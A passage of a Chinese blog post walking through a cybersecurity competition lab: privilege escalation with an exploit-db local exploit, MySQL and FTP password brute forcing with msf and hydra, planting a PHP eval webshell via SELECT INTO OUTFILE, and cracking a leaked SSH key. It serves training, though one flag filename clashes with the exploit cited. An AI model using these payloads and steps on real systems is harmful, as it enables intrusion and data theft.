+<p><img src="/images/wordimage/2022/1020/uname.png"></p>
+<p>获得FLAG，<code>FLAG[3.13.0]</code></p>
+<hr>
+<h3 id="6-在Kali攻击机中查找可使用的漏洞源码"><a href="#6-在Kali攻击机中查找可使用的漏洞源码" class="headerlink" title="6.在Kali攻击机中查找可使用的漏洞源码"></a>6.在Kali攻击机中查找可使用的漏洞源码</h3><blockquote>
+<p>在Kali攻击机中查找可使用的漏洞源码，将找到的漏洞源码文件名作为FLAG（形式：[文件名]）提交；</p>
+</blockquote>
+<p>上面查看到了系统版本信息，可以使用KALI自带的命令<code>searchsploit</code>命令来寻找，命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token number">3.13</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图。</p>
+<p><img src="/images/wordimage/2022/1020/37292.c.png"></p>
+<p>就可以获得FLAG，<code>FLAG[37972.c]</code></p>
+<hr>
+<h3 id="7-获取FLAG"><a href="#7-获取FLAG" class="headerlink" title="7.获取FLAG"></a>7.获取FLAG</h3><blockquote>
+<p>7.利用上述漏洞源码后获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：[文件名]）提交；</p>
+</blockquote>
+<p>环境依然是在上面用msf获取的shell里面操作，先说思路，这东西是提权的，KALI开启Web服务，然后控制靶机下载，靶机运行获得root权限，查看flag完事，</p>
+<p>首先要给靶机换一个BASH，发现靶机有python可以使用python更换，命令如下。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图。</p>
+<p><img src="/images/wordimage/2022/1020/python.png"></p>
+<p>然后发现靶机里面也有GCC编译器，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/gcc.png"></p>
+<p>之后就可以把源码复制到KALI桌面上来，，命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>之后就可以开启KALI的web服务，这里开启的是<code>apache2</code>服务，然后把桌面源码直接复制到网页目录下面，当然你也可以直接复制到网页目录下面，具体操作如下图。</p>
+<p><img src="/images/wordimage/2022/1020/kaliweb.png"></p>
+<p>之后回到靶机，使用<code>wget</code>命令下载，具体如下图，这样就把C源码下载到了靶机里面。</p>
+<p><img src="/images/wordimage/2022/1020/tmp.png"></p>
+<p>然后我们就可以使用靶机自带的<code>gcc</code>编译，命令如下，具体如下图。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">37292</span>.c -o shell <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/wordimage/2022/1020/shell.png"></p>
+<p>之后我们在运行生成的shell文件，获取到了root权限，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/getroot.png"></p>
+<p>然后根据题目要求，直接查看<code>/root</code>目录下的txt文本，所以就可以获得最终flag，<code>FLAG[adftutij.txt]</code></p>
+<hr>
+<h3 id="8-内容flag"><a href="#8-内容flag" class="headerlink" title="8.内容flag"></a>8.内容flag</h3><blockquote>
+<p>利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：[文件内容]）提交</p>
+</blockquote>
+<p>根据上面第7题获得的文本文件，使用cat命令打开之后可以获取，所以flag,<code>FLAG[hyjufk983]</code></p>
+<hr>
+<h2 id="B-2-Linux操作系统渗透测试"><a href="#B-2-Linux操作系统渗透测试" class="headerlink" title="B-2.Linux操作系统渗透测试"></a>B-2.Linux操作系统渗透测试</h2><h3 id="1-获取后缀为-bmp文件的文件名"><a href="#1-获取后缀为-bmp文件的文件名" class="headerlink" title="1.获取后缀为.bmp文件的文件名"></a>1.获取后缀为.bmp文件的文件名</h3><blockquote>
+<ol>
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；</li>
+</ol>
+</blockquote>
+<p>首先进行简单的nmap扫描，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/nmap2.png"></p>
+<p>这里省去一切步骤，发现有Mysql直接对Mysql进行暴力破解，使用msf，具体如下图设置。</p>
+<p><img src="/images/wordimage/2022/1020/showmysql.png"></p>
+<p>如下图，找到了密码。</p>
+<p><img src="/images/wordimage/2022/1020/mysqlpass.png"></p>
+<blockquote>
+<p>Mysql账户：root</p>
+<p>Mysql密码：aababb</p>
+</blockquote>
+<p>接下来就可以直接连接，然后写入一句话木马，写入一句话木马命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST["shell"])?>'</span> into outfile <span class="token string">'/var/www/html/muma.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图。</p>
+<p><img src="/images/wordimage/2022/1020/mysqlmuma.png"></p>
+<p>之后就可以访问网站，然后用蚁剑或者菜刀或者其他工具连接即可，这里使用的是蚁剑，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/mysqlshell.png"></p>
+<p>然后就可以找到题目要求的文件，如下图，所以flag为：<code>FLAG[wuslwczr]</code></p>
+<p><img src="/images/wordimage/2022/1020/flag2.png"></p>
+<hr>
+<h3 id="2-图片文件中的英文单词"><a href="#2-图片文件中的英文单词" class="headerlink" title="2.图片文件中的英文单词"></a>2.图片文件中的英文单词</h3><blockquote>
+<ol start="2">
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；</li>
+</ol>
+</blockquote>
+<p>很简单打开上面获取的bmp即可，如下图，所以flag为,<code>FLAG[gutldhan]</code></p>
+<p><img src="/images/wordimage/2022/1020/gutldhan.png"></p>
+<hr>
+<h3 id="3-var-vsftpd目录中后缀为-docx文件"><a href="#3-var-vsftpd目录中后缀为-docx文件" class="headerlink" title="3./var/vsftpd目录中后缀为.docx文件"></a>3./var/vsftpd目录中后缀为.docx文件</h3><blockquote>
+<ol>
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；</li>
+</ol>
+</blockquote>
+<p>如下图，不能通关蚁剑直接查看，思路是获取ftp用户密码登录查看。</p>
+<p><img src="/images/wordimage/2022/1020/noftp.png"></p>
+<p>首先查看<code>/etc/passwd</code>查看用户，如下图，发现两个用户，可以使用<code>hydra</code>进行暴力破解ftp</p>
+<p><img src="/images/wordimage/2022/1020/twousers.png"></p>
+<p>使用hydra进行暴力破解，命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L user.txt -P rockyou.txt ftp://192.168.10.68<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图，获得两个账户密码。</p>
+<blockquote>
+<p>账户1：drunk915，密码：aaabb3</p>
+<p>账户2：reafcn137，密码：aaabba</p>
+</blockquote>
+<p><img src="/images/wordimage/2022/1020/ftpuserpass.png"></p>
+<p>接下来就可以登录FTP查看文件，如下图，所以根据题目获得flag，<code>FLAG[bmqfldne]</code></p>
+<p><img src="/images/wordimage/2022/1020/bmqfldne.png"></p>
+<hr>
+<h3 id="4-获取docx的内容"><a href="#4-获取docx的内容" class="headerlink" title="4.获取docx的内容"></a>4.获取docx的内容</h3><blockquote>
+<ol>
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；</li>
+</ol>
+</blockquote>
+<p>还是根据上面的获取的docx文件打开即可，使用命令如下，下载成功之后直接打卡即可，所以获得FLAG，<code>FLAG[tywajsfk]</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get bmqfldne.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如下图，</p>
+<p><img src="/images/wordimage/2022/1020/tywajsfk.png"></p>
+<hr>
+<h3 id="5-home-guest目录中后缀为-pdf"><a href="#5-home-guest目录中后缀为-pdf" class="headerlink" title="5./home/guest目录中后缀为.pdf"></a>5./home/guest目录中后缀为.pdf</h3><blockquote>
+<p>5.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；</p>
+</blockquote>
+<p>登录drunk915用户即可看见，如下图，所以flag是，<code>FLAG[useansma]</code></p>
+<p><img src="/images/wordimage/2022/1020/useansma.png"></p>
+<hr>
+<h3 id="6-获取pdf内容"><a href="#6-获取pdf内容" class="headerlink" title="6.获取pdf内容"></a>6.获取pdf内容</h3><blockquote>
+<ol start="6">
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；</li>
+</ol>
+</blockquote>
+<p>命令如下，命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get useansma.pdf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如下图，获取到flag，<code>FLAG[jtluqwtr]</code></p>
+<p><img src="/images/wordimage/2022/1020/jtluqwtr.png"></p>
+<hr>
+<h3 id="7-获得root下的txt"><a href="#7-获得root下的txt" class="headerlink" title="7.获得root下的txt"></a>7.获得root下的txt</h3><blockquote>
+<p>7.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称</p>
+</blockquote>
+<p>无</p>
+<hr>
+<h3 id="8-获取root下的txt文本里面的内容"><a href="#8-获取root下的txt文本里面的内容" class="headerlink" title="8.获取root下的txt文本里面的内容"></a>8.获取root下的txt文本里面的内容</h3><blockquote>
+<ol start="8">
+<li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。</li>
+</ol>
+</blockquote>
+<p>无</p>
+<hr>
+<h2 id="B-3-应用服务漏洞扫描与利用"><a href="#B-3-应用服务漏洞扫描与利用" class="headerlink" title="B-3.应用服务漏洞扫描与利用"></a>B-3.应用服务漏洞扫描与利用</h2><h3 id="1-nmap探测目标靶机的服务版本信息"><a href="#1-nmap探测目标靶机的服务版本信息" class="headerlink" title="1.nmap探测目标靶机的服务版本信息"></a>1.nmap探测目标靶机的服务版本信息</h3><blockquote>
+<p>1.使用命令nmap探测目标靶机的服务版本信息，将需要使用的参数作为FLAG进行提交；</p>
+</blockquote>
+<p>使用扫描版本的命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token number">192.168</span>.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如下图，所以FLAG是，<code>FLAG[sV]</code></p>
+<p><img src="/images/wordimage/2022/1020/nmapsv.png"></p>
+<hr>
+<h3 id="2-找到敏感文件"><a href="#2-找到敏感文件" class="headerlink" title="2.找到敏感文件"></a>2.找到敏感文件</h3><blockquote>
+<p>2.通过上述端口访问靶机系统并探测隐藏的页面，将找到的敏感文件、目录名作为FLAG（形式：[敏感文件或目录1,敏感文件或目录2…,敏感文件或目录n]）提交；</p>
+</blockquote>
+<p>根据题目要求可以使用kali自带的dirb工具来进行扫描，如下图，扫80端口没扫出来什么，但是31337端口也开放了web服务所以扫描31337端口，扫出来了一堆敏感目录，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/dirb.png"></p>
+<hr>
+<h3 id="3-私钥和认证关键字文件"><a href="#3-私钥和认证关键字文件" class="headerlink" title="3.私钥和认证关键字文件"></a>3.私钥和认证关键字文件</h3><blockquote>
+<p>3.通过上述敏感文件或目录下载可利用的私钥和认证关键字文件，将私钥文件名和认证关键字文件名作为FLAG（形式：[私钥文件名,认证关键字文件名]）进行提交；</p>
+</blockquote>
+<p>在第二题扫出来了.ssh隐藏文件，可以直接打开浏览器访问，如下图，所以获取FLAG，<code>FLAG[&#39;id_rsa&#39;,&#39;authorized_keys&#39;]</code></p>
+<p><img src="/images/wordimage/2022/1020/sshfile.png"></p>
+<hr>
+<h3 id="4-认证关键字文件中的用户名"><a href="#4-认证关键字文件中的用户名" class="headerlink" title="4.认证关键字文件中的用户名"></a>4.认证关键字文件中的用户名</h3><blockquote>
+<p>4.查找认证关键字文件中用于登录靶机服务器的用户名，将用户名作为FLAG提交；</p>
+</blockquote>
+<p>在上面题找到的文件可以使用历览器的方式下载，然后直接使用cat命令查看即可，具体如下图，所以FLAG是，<code>FLAG[simon]</code></p>
+<p><img src="/images/wordimage/2022/1020/simon.png"></p>
+<hr>
+<h3 id="5-用户名及私钥登录靶机服务器"><a href="#5-用户名及私钥登录靶机服务器" class="headerlink" title="5.用户名及私钥登录靶机服务器"></a>5.用户名及私钥登录靶机服务器</h3><blockquote>
+<p>5.使用该用户名及私钥登录靶机服务器，将服务器返回信息的第一行结尾的最后一个英文单词作为FLAG提交；</p>
+</blockquote>
+<p>使用命令如下，具体如下图，所以获得FLAG为,<code>FLAG[open]</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa simon@192.168.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/wordimage/2022/1020/open.png"></p>
+<hr>
+<h3 id="6-解密私钥文件"><a href="#6-解密私钥文件" class="headerlink" title="6.解密私钥文件"></a>6.解密私钥文件</h3><blockquote>
+<p>6.将私钥文件进行格式转换后进行解密，将成功解密出的密码作为FLAG提交；</p>
+</blockquote>
+<p>这里需要用到<code>ssh2john</code>这个工具来进行解密，但是kali没有，但是又在这个目录找到了<code>/usr/share/john/ssh2john.py</code>里面，所以可以使用的两个命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/usr/share/john/ssh2john.py id_rsa > t.txt</span>
+
+<span class="token comment">#john t.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>具体如下图，获得密码，所以flag是，<code>FLAG[starwars]</code></p>
+<p><img src="/images/wordimage/2022/1020/starwars.png"></p>
+<hr>
+<h3 id="7-溢出程序进行提权"><a href="#7-溢出程序进行提权" class="headerlink" title="7.溢出程序进行提权"></a>7.溢出程序进行提权</h3><blockquote>
+<p>7.利用靶机服务器上的溢出程序进行提权，将接收用户输入的缓冲区的大小作为FLAG提交；</p>
+</blockquote>
+<p>先利用上面获得密码和用户进行登录，登录命令如下，但是有一个问题啊，如果直接使用登录命令进行登录，那么会报错，所以得把文件的权限改低一点，命令是<code>chmod 600 id_rsa</code>。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#登录命令</span>
+<span class="token function">ssh</span> -i id_rsa simon@192.168.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>​    账户：simon</p>
+<p>​    密码：starwars</p>
+</blockquote>
+<p>做到这里我才发现这不就是私钥泄露的题目吗，之前还写过文章，比较懒就直接放文章链接了<a target="_blank" rel="noopener" href="https://blog.takagisan.top/2022/04bcba730c.html">私钥泄露</a>。</p>
+<hr>
+<h2 id="B-4-SQL注入测试（PL）"><a href="#B-4-SQL注入测试（PL）" class="headerlink" title="B-4.SQL注入测试（PL）"></a>B-4.SQL注入测试（PL）</h2>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">坂琴</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.takagisan.top/2022/107cfb74bb.html">https://www.takagisan.top/2022/107cfb74bb.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">坂琴</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '2CRS1n25zIYnK5HeDRr1ExBy-gzGzoHsz',
+        appKey: 'aIkJLkdDDj3qV85F5tSx4CnB',
+        notify: 'true' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '☆*: .｡. o(≧▽≦)o .｡.:*☆/请输入你的邮箱，昵称和网址吧！'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/09bab92b3c.html">
+                    <div class="card-image">
+                        
+                        <img src="/images/2023/2023-9/2023-9-23/niao.png" class="responsive-img" alt="时间过得真快啊~">
+                        
+                        <span class="card-title">时间过得真快啊~</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            说一下这一年的感受
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%BF%83%E6%83%85%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    心情记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%BF%83%E6%83%85%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">心情记录</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/10ca82b0f.html">
+                    <div class="card-image">
+                        
+                        <img src="/images/baimao.jpg" class="responsive-img" alt="网络安全金砖五国国赛-a模块-练习题">
+                        
+                        <span class="card-title">网络安全金砖五国国赛-a模块-练习题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            网络安全国赛a模块练习
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%87%91%E7%A0%96%E4%BA%94%E5%9B%BD%E5%9B%BD%E8%B5%9B/" class="post-category">
+                                    网络安全金砖五国国赛
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">
+                        <span class="chip bg-color">系统加固</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
